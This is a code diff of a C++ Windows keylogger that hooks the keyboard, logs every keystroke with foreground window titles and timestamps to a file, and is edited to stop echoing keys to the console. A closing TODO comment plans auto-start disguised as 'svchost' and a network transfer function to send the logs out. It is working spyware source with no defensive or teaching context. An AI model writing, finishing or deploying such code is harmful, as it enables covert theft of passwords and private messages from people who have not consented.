@@ -1,4 +1,4 @@
-#define _CRT_SECURE_NO_WARNINGS
+#define _CRT_SECURE_NO_WARNINGS //set to ignore the security warning on the compiler
 
 #include <Windows.h>
 #include <time.h>
@@ -22,7 +22,7 @@ KBDLLHOOKSTRUCT kbdStruct;
 int Save(int key_stroke);
 std::ofstream OUTPUT_FILE;
 
-extern char lastwindow[256];
+/*extern*/ char lastwindow[256];
 
 // This is the callback function. Consider it the event that is raised when, in this case, 
 // a key is pressed.
@@ -64,15 +64,16 @@ void ReleaseHook()
 
 int Save(int key_stroke)
 {
-	char lastwindow[256];
+	//char lastwindow[256];
 
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0; // ignore mouse clicks
 
 	HWND foreground = GetForegroundWindow();
 	DWORD threadID;
-	HKL layout;
-	if (foreground) {
+	HKL layout = NULL;
+	if (foreground) 
+	{
 		//get keyboard layout of the thread
 		threadID = GetWindowThreadProcessId(foreground, NULL);
 		layout = GetKeyboardLayout(threadID);
@@ -83,7 +84,9 @@ int Save(int key_stroke)
 		char window_title[256];
 		GetWindowText(foreground, window_title, 256);
 
-		if (strcmp(window_title, lastwindow) != 0) {
+		//if lastwindow title is not the same as current window_title
+		if (strcmp(window_title, lastwindow) != 0) 
+		{
 			strcpy(lastwindow, window_title);
 
 			// get time
@@ -91,13 +94,12 @@ int Save(int key_stroke)
 			struct tm *tm = localtime(&t);
 			char s[64];
 			strftime(s, sizeof(s), "%c", tm);
-
 			OUTPUT_FILE << "\n\n[Window: " << window_title << " - at " << s << "] ";
 		}
 	}
 
-
-	std::cout << key_stroke << '\n';
+	//output for the command window
+	//std::cout << key_stroke << '\n';
 
 	if (key_stroke == VK_BACK)
 		OUTPUT_FILE << "[BACKSPACE]";
@@ -131,7 +133,8 @@ int Save(int key_stroke)
 		OUTPUT_FILE << "-";
 	else if (key_stroke == 20)
 		OUTPUT_FILE << "[CAPSLOCK]";
-	else {
+	else 
+	{
 		char key;
 		// check caps lock
 		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
@@ -181,3 +184,12 @@ int main()
 	{
 	}
 }
+
+
+/*
+	add a method for the logger to start on startup - svchost
+	add a better format for the log
+	add network transfer function
+	add a new line when enter key pressed
+	keep 
+*/
